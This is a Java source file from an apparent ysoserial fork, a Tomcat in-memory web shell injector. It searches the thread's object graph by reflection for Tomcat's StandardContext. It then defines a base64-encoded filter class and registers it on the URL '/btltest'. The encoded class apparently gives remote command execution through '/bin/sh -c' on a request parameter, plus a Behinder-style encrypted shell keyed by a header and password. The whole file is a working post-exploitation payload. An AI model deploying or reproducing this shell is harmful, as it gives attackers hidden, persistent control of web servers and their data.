package ysoserial.template;


import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.deploy.FilterDef;
import org.apache.catalina.deploy.FilterMap;
import sun.misc.BASE64Decoder;

import javax.servlet.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.util.*;

public class DFSTomcatMemShell {

    private HashSet set = new HashSet();
    private Object standard_context_obj;
    private Class standard_context_clazz = Class.forName("org.apache.catalina.core.StandardContext");

    public DFSTomcatMemShell() throws Exception {
        standard_context_obj = null;
        search(Thread.currentThread());
        if(standard_context_clazz.isAssignableFrom(getStandardContext().getClass()) ) {
            System.out.println("Found StandardContext");
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class clazz = null;
            BASE64Decoder base64Decoder = new BASE64Decoder();
            String codeClass = "yv66vgAAADMBdAoAQwCvCACwCQBjALEIALIJAGMAswgAtAkAYwC1CgBjALYJALcAuAgAuQoAugC7\n" +
                "CAC8CwC9AL4IAL8KABMAwAoAEwDBCQDCAMMIAMQHAMUIAMYIAMcIAMgIAMkHAMoKAMsAzAoAywDN\n" +
                "CgDOAM8KABgA0AgA0QoAGADSCgAYANMLANQA1QoA1gC7BwDXCwAiANgIANkLACIA2ggA2wsAIgDc\n" +
                "CADdCwDeAN8IAOAKAOEA4gcA4wcA5AoALQCvCwDeAOUKAC0A5ggA5woALQDoCgAtAOkKABMA6goA\n" +
                "LADrCgDhAOwHAO0KADcArwsAvQDuCgDvAPAKADcA8QoA4QDyCQBjAPMIAPQHAPUHAIEHAPYKAD8A\n" +
                "9wcA+AoA+QD6CgD5APsKAPwA/QoAPwD+CAD/BwEACgBJAQEIAQIKAEkBAwgBBAcBBQgBBgcBBwoA\n" +
                "UAEICwEJAQoIAQsKAEEBDAcBDQoAQwEOCQEPARAHAREKAD8BEggBEwoA/AEUCgEPARUHARYKAF0B\n" +
                "CAcBFwoAXwEIBwEYCgBhAQgHARkHARoBABJteUNsYXNzTG9hZGVyQ2xhenoBABFMamF2YS9sYW5n\n" +
                "L0NsYXNzOwEAEGJhc2ljQ21kU2hlbGxQd2QBABJMamF2YS9sYW5nL1N0cmluZzsBABNiZWhpbmRl\n" +
                "clNoZWxsSGVhZGVyAQAQYmVoaW5kZXJTaGVsbFB3ZAEABjxpbml0PgEAAygpVgEABENvZGUBAA9M\n" +
                "aW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAqTHlzb3NlcmlhbC90\n" +
                "ZW1wbGF0ZS9EeW5hbWljRmlsdGVyVGVtcGxhdGU7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9G\n" +
                "aWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25m\n" +
                "aWc7AQAKRXhjZXB0aW9ucwcBGwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRS\n" +
                "ZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0\n" +
                "ZXJDaGFpbjspVgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQABawEABmNp\n" +
                "cGhlcgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADmV2aWxDbGFzc0J5dGVzAQACW0IBAAlldmls\n" +
                "Q2xhc3MBAAR2YXI4AQASTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyOQEAGkxqYXZhL2xhbmcvcmVm\n" +
                "bGVjdC9NZXRob2Q7AQAFdmFyMTABABNMamF2YS91dGlsL0hhc2hNYXA7AQAVTGphdmEvbGFuZy9F\n" +
                "eGNlcHRpb247AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVz\n" +
                "dDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAL\n" +
                "ZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAA1TdGFja01hcFRhYmxl\n" +
                "BwDFBwEcBwB7BwEHAQAHZGVzdHJveQEACmluaXRpYWxpemUBAAR2YXI3AQAhTGphdmEvbGFuZy9O\n" +
                "b1N1Y2hNZXRob2RFeGNlcHRpb247AQAFY2xhenoBAAZtZXRob2QBAARjb2RlAQAFYnl0ZXMBACJM\n" +
                "amF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9s\n" +
                "YW5nL0NsYXNzTG9hZGVyOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBABVM\n" +
                "amF2YS9pby9JT0V4Y2VwdGlvbjsBAAV2YXIxMQEALUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0\n" +
                "aW9uVGFyZ2V0RXhjZXB0aW9uOwcBGQcA9gcBDQcA9QcBHQcBEQcBFgcBFwcBGAEAClNvdXJjZUZp\n" +
                "bGUBABpEeW5hbWljRmlsdGVyVGVtcGxhdGUuamF2YQwAawBsAQAEcGFzcwwAZwBoAQAMWC1PcHRp\n" +
                "b25zLUJpDABpAGgBABAyMDJjYjk2MmFjNTkwNzViDABqAGgMAJYAbAcBHgwBHwEgAQAdWytdIER5\n" +
                "bmFtaWMgRmlsdGVyIHNheXMgaGVsbG8HASEMASIBIwEABHR5cGUHASQMASUBJgEABWJhc2ljDAD/\n" +
                "AScMASgBKQcBKgwBKwBoAQABLwEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAANj\n" +
                "bWQBAAIvQwEAEWphdmEvdXRpbC9TY2FubmVyBwEsDAEtAS4MAS8BMAcBMQwBMgEzDABrATQBAAJc\n" +
                "QQwBNQE2DAE3ATgHATkMAToBOwcBPAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJl\n" +
                "cXVlc3QMAT0BJgEAB3h4eHh4eDEMAT4BOAEABFBPU1QMAT8BQAEAAXUHAUEMAUIBQwEAA0FFUwcB\n" +
                "HAwBRAFFAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwEAF2phdmEvbGFuZy9TdHJp\n" +
                "bmdCdWlsZGVyDAFGAUcMAUgBSQEAAAwBSAFKDAFLATgMAUwBTQwAawFODAByAU8BABZzdW4vbWlz\n" +
                "Yy9CQVNFNjREZWNvZGVyDAFQAVEHAVIMAVMBOAwBVAFVDAFWAVcMAGUAZgEAC2RlZmluZUNsYXNz\n" +
                "AQAPamF2YS9sYW5nL0NsYXNzAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDAFYAVkBABBqYXZhL2xh\n" +
                "bmcvT2JqZWN0BwFaDAFbAVwMAV0BXgcBHQwBXwFgDAFhAWIBAAZlcXVhbHMBABFqYXZhL3V0aWwv\n" +
                "SGFzaE1hcAwAawFjAQAHc2Vzc2lvbgwBZAFlAQAIcmVzcG9uc2UBACZqYXZheC9zZXJ2bGV0L2h0\n" +
                "dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAB3JlcXVlc3QBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFm\n" +
                "AGwHAWcMAHgBaAEAJ2NvbS5mZWlob25nLmxkYXAudGVtcGxhdGUuTXlDbGFzc0xvYWRlcgwBaQFq\n" +
                "AQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MAWsBbAcBbQwBbgBmAQAfamF2YS9s\n" +
                "YW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgwBbwFsAQMceXY2NnZnQUFBRElBR3dvQUJRQVdCd0FY\n" +
                "Q2dBQ0FCWUtBQUlBR0FjQUdRRUFCanhwYm1sMFBnRUFHaWhNYW1GMllTOXNZVzVuTDBOc1lYTnpU\n" +
                "RzloWkdWeU95bFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFFa3h2WTJGc1Zt\n" +
                "RnlhV0ZpYkdWVVlXSnNaUUVBQkhSb2FYTUJBQ2xNWTI5dEwyWmxhV2h2Ym1jdmJHUmhjQzkwWlcx\n" +
                "d2JHRjBaUzlOZVVOc1lYTnpURzloWkdWeU93RUFBV01CQUJkTWFtRjJZUzlzWVc1bkwwTnNZWE56\n" +
                "VEc5aFpHVnlPd0VBQzJSbFptbHVaVU5zWVhOekFRQXNLRnRDVEdwaGRtRXZiR0Z1Wnk5RGJHRnpj\n" +
                "MHh2WVdSbGNqc3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQVZpZVhSbGN3RUFBbHRDQVFBTFky\n" +
                "eGhjM05NYjJGa1pYSUJBQXBUYjNWeVkyVkdhV3hsQVFBU1RYbERiR0Z6YzB4dllXUmxjaTVxWVha\n" +
                "aERBQUdBQWNCQUNkamIyMHZabVZwYUc5dVp5OXNaR0Z3TDNSbGJYQnNZWFJsTDAxNVEyeGhjM05N\n" +
                "YjJGa1pYSU1BQThBR2dFQUZXcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjZ0VBRnloYlFrbEpL\n" +
                "VXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBQ0VBQWdBRkFBQUFBQUFDQUFBQUJnQUhBQUVBQ0FBQUFE\n" +
                "b0FBZ0FDQUFBQUJpb3J0d0FCc1FBQUFBSUFDUUFBQUFZQUFRQUFBQVFBQ2dBQUFCWUFBZ0FBQUFZ\n" +
                "QUN3QU1BQUFBQUFBR0FBMEFEZ0FCQUFrQUR3QVFBQUVBQ0FBQUFFUUFCQUFDQUFBQUVMc0FBbGty\n" +
                "dHdBREtnTXF2cllBQkxBQUFBQUNBQWtBQUFBR0FBRUFBQUFJQUFvQUFBQVdBQUlBQUFBUUFCRUFF\n" +
                "Z0FBQUFBQUVBQVRBQTRBQVFBQkFCUUFBQUFDQUJVPQwBcAFxDAFyAXMBACBqYXZhL2xhbmcvSWxs\n" +
                "ZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BACtqYXZhL2xhbmcvcmVm\n" +
                "bGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uAQAoeXNvc2VyaWFsL3RlbXBsYXRlL0R5bmFt\n" +
                "aWNGaWx0ZXJUZW1wbGF0ZQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9T\n" +
                "ZXJ2bGV0RXhjZXB0aW9uAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAGGphdmEvbGFuZy9yZWZsZWN0\n" +
                "L01ldGhvZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsB\n" +
                "ABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEA\n" +
                "HGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFu\n" +
                "Zy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAB2lz\n" +
                "RW1wdHkBAAMoKVoBAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBABFqYXZhL2xhbmcvUnVudGlt\n" +
                "ZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9s\n" +
                "YW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0\n" +
                "SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0\n" +
                "cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9T\n" +
                "Y2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAHWphdmF4L3NlcnZsZXQvU2Vy\n" +
                "dmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZh\n" +
                "L2lvL1ByaW50V3JpdGVyAQAJZ2V0SGVhZGVyAQAJZ2V0TWV0aG9kAQAKZ2V0U2Vzc2lvbgEAIigp\n" +
                "TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0\n" +
                "cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9P\n" +
                "YmplY3Q7KVYBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0\n" +
                "by9DaXBoZXI7AQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5n\n" +
                "L09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5n\n" +
                "QnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsB\n" +
                "AAh0b1N0cmluZwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAX\n" +
                "KElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVk\n" +
                "UmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEADGRlY29kZUJ1ZmZl\n" +
                "cgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQARZ2V0RGVjbGFy\n" +
                "ZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xh\n" +
                "bmcvcmVmbGVjdC9NZXRob2Q7AQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQo\n" +
                "KUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFu\n" +
                "Zy9DbGFzc0xvYWRlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcv\n" +
                "T2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9P\n" +
                "YmplY3Q7AQAEKEkpVgEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVj\n" +
                "dDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAZamF2YXgvc2VydmxldC9G\n" +
                "aWx0ZXJDaGFpbgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2Vydmxl\n" +
                "dC9TZXJ2bGV0UmVzcG9uc2U7KVYBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxq\n" +
                "YXZhL2xhbmcvQ2xhc3M7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9s\n" +
                "YW5nL0ludGVnZXIBAARUWVBFAQANZ2V0U3VwZXJjbGFzcwEADXNldEFjY2Vzc2libGUBAAQoWilW\n" +
                "AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsAIQBjAEMAAQBkAAQAAgBlAGYAAAAC\n" +
                "AGcAaAAAAAIAaQBoAAAAAgBqAGgAAAAFAAEAawBsAAEAbQAAAFkAAgABAAAAGyq3AAEqEgK1AAMq\n" +
                "EgS1AAUqEga1AAcqtwAIsQAAAAIAbgAAABoABgAAAB0ABAAZAAoAGgAQABsAFgAeABoAHwBvAAAA\n" +
                "DAABAAAAGwBwAHEAAAABAHIAcwACAG0AAAA1AAAAAgAAAAGxAAAAAgBuAAAABgABAAAAIgBvAAAA\n" +
                "FgACAAAAAQBwAHEAAAAAAAEAdAB1AAEAdgAAAAQAAQB3AAEAeAB5AAIAbQAAA1cABwALAAAB4rIA\n" +
                "CRIKtgALKxIMuQANAgDGAJErEgy5AA0CABIOtgAPmQCBKyq0AAO5AA0CADoEGQTGAbAZBLYAEJoB\n" +
                "qAE6BbIAERIStgAPmQAbBr0AE1kDEhRTWQQSFVNZBRkEUzoGpwAYBr0AE1kDEhZTWQQSF1NZBRkE\n" +
                "UzoGuwAYWbgAGRkGtgAatgAbtwAcEh22AB62AB86Byy5ACABABkHtgAhpwFDK8AAIiq0AAW5ACMC\n" +
                "AMYBK7IACRIktgALK8AAIrkAJQEAEia2AA+ZAQUqtAAHOgQrwAAiuQAnAQASKBkEuQApAwASKrgA\n" +
                "KzoFGQUFuwAsWbsALVm3AC4rwAAiuQAnAQASKLkALwIAtgAwEjG2ADK2ADO2ADQSKrcANbYANhkF\n" +
                "uwA3WbcAOCu5ADkBALYAOrYAO7YAPDoGKrQAPRI+Bb0AP1kDEwBAU1kEEwBBU7YAQgHAAEMFvQBD\n" +
                "WQMZBlNZBLgARLYARVO2AEbAAD86BxkHtgBHOggZBxJIBL0AP1kDEwBDU7YAQjoJuwBJWQa3AEo6\n" +
                "ChkKEksrwAAiuQAnAQC2AExXGQoSTSzAAE62AExXGQoSTyvAACK2AExXGQkZCAS9AENZAxkKU7YA\n" +
                "RlenABU6BhkGtgBRpwALLSssuQBSAwCxAAEAsQHMAc8AUAADAG4AAACGACEAAAAlAAgAKAAjACkA\n" +
                "LwAqADwAKwA/AC0ASgAuAGIAMAB3ADMAkwA0AJ4ANQChADYAsQA4ALkAOQDKADoA0AA7AOIAPADp\n" +
                "AD0BHQA+ATcAPwFuAEABdQBBAYgAQgGSAEMBowBEAa8ARQG7AEYBzABKAc8ASAHRAEkB1gBKAdkA\n" +
                "TAHhAE8AbwAAAKwAEQBfAAMAegB7AAYAdwAnAHoAewAGAJMACwB8AGgABwAvAHIAfQBoAAQAPwBi\n" +
                "AH4AfwAFATcAlQCAAIEABgFuAF4AggBmAAcBdQBXAIMAhAAIAYgARACFAIYACQGSADoAhwCIAAoA\n" +
                "0AD8AH0AaAAEAOkA4wB+AH8ABQHRAAUAhwCJAAYAAAHiAHAAcQAAAAAB4gCKAIsAAQAAAeIAjACN\n" +
                "AAIAAAHiAI4AjwADAJAAAAAdAAf9AGIHAJEHAJL8ABQHAJP4ACn7ASpCBwCUCQcAdgAAAAYAAgBf\n" +
                "AHcAAQCVAGwAAQBtAAAAKwAAAAEAAAABsQAAAAIAbgAAAAYAAQAAAFIAbwAAAAwAAQAAAAEAcABx\n" +
                "AAAAAgCWAGwAAQBtAAACBQAHAAcAAACruABEtgBFTCorElO2AFS1AD2nAIFNK7YAVk4BOgQZBMcA\n" +
                "NS0TAEOlAC4tEj4GvQA/WQMTAEBTWQSyAFdTWQWyAFdTtgBCOgSn/9Y6BS22AFlOp//MElo6BbsA\n" +
                "N1m3ADgZBbYAOzoGGQQEtgBbKhkEKwa9AENZAxkGU1kEA7gAXFNZBRkGvrgAXFO2AEbAAD+1AD2n\n" +
                "ABhMK7YAXqcAEEwrtgBgpwAITCu2AGKxAAUABwARABQAVQApAEcASgBYAAAAkgCVAF0AAACSAJ0A\n" +
                "XwAAAJIApQBhAAMAbgAAAGoAGgAAAFYABwBZABEAagAUAFoAFQBbABoAXAAdAF4AKQBgAEcAYwBK\n" +
                "AGEATABiAFEAYwBUAGYAWABnAGYAaABsAGkAkgBxAJUAawCWAGwAmgBxAJ0AbQCeAG4AogBxAKUA\n" +
                "bwCmAHAAqgBzAG8AAABwAAsATAAFAJcAmAAFABoAeACZAGYAAwAdAHUAmgCGAAQAWAA6AJsAaAAF\n" +
                "AGYALACcAIEABgAVAH0AgwCdAAIABwCLAJ4AnwABAJYABACFAKAAAQCeAAQAhwChAAEApgAEAKIA\n" +
                "owABAAAAqwBwAHEAAACQAAAAOgAJ/wAUAAIHAKQHAKUAAQcApv4ACAcApgcApwcAqGwHAKkJ/wA9\n" +
                "AAEHAKQAAEIHAKpHBwCrRwcArAQAAQCtAAAAAgCu";
            byte[] bytes = base64Decoder.decodeBuffer(codeClass);
            Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            method.setAccessible(true);
            clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);

            StandardContext standardCtx = (StandardContext) standard_context_obj;
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName("TestFilter");
            filterDef.setFilter((Filter) clazz.newInstance());
            standardCtx.addFilterDef(filterDef);
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDef.getClass());
            constructor.setAccessible(true);
            ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardCtx, filterDef);
            Field field = standardCtx.getClass().getDeclaredField("filterConfigs");
            field.setAccessible(true);
            Map applicationFilterConfigs = (Map) field.get(standardCtx);
            applicationFilterConfigs.put("TestFilter", applicationFilterConfig);
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName("TestFilter");
            filterMap.addURLPattern("/btltest");
            //动态应用FilterMap
            standardCtx.addFilterMap(filterMap);
        }
    }


    public Object getStandardContext(){
        return standard_context_obj;
    }

    public void search(Object obj) throws IllegalAccessException {
        if (obj == null){
            return;
        }
        if (standard_context_obj != null){
            return;
        }
        if (obj.getClass().equals(Object.class) ) {
            return;
        }
        if (standard_context_clazz.isAssignableFrom(obj.getClass())){
            System.out.println("Found standardContext");
            standard_context_obj = obj;
            return;
        }
        if (obj.getClass().isArray()) {
            for (int i = 0; i < Array.getLength(obj); i++) {
                search(Array.get(obj, i));
            }
        } else {
            Queue q = getAllFields(obj);
            while (!q.isEmpty()) {
                Field field = (Field) q.poll();
                field.setAccessible(true);
                Object fieldValue = field.get(obj);
                if(standard_context_clazz.isAssignableFrom(fieldValue.getClass())){
                    System.out.println("Found standard context1");
                    standard_context_obj = fieldValue;
                }
                else{
                    search(fieldValue);
                }

            }
        }
    }

    public Queue getAllFields(Object obj) throws IllegalAccessException {
        Queue queue = new LinkedList();
        for (Class clazz = obj.getClass(); clazz != null; clazz = clazz.getSuperclass()) {
            Field[] fields = clazz.getDeclaredFields();
            for (Field f : fields) {
                if (f.getType().isPrimitive()) {
                    continue;
                } else if (f.getType().isArray() && f.getType().getComponentType().isPrimitive()) {
                    continue;
                }  else {
                    f.setAccessible(true);
                    Object fieldValue = f.get(obj);
                    if (fieldValue != null) {
                        int hashcode = fieldValue.hashCode();
                        if (set.contains(hashcode)) {
                        } else {
                            set.add(hashcode);
                            queue.offer(f);
                        }
                    }
                }
            }
        }
        return queue;
    }

}

